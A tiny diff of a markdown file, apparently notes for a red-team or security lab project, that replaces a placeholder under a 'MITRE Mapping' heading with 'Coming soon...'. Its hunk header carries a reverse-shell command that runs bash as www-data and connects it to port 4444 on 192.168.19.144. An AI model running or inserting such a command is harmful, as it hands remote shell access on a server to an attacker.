@@ -74,4 +74,5 @@ sudo -u www-data bash -c "bash -i >& /dev/tcp/192.168.19.144/4444 0>&1"
 ---
 
 ## 🧪 V2.1 MITRE Mapping: Direct mapping to ATT&CK techniques
-xXx
+
+Coming soon...
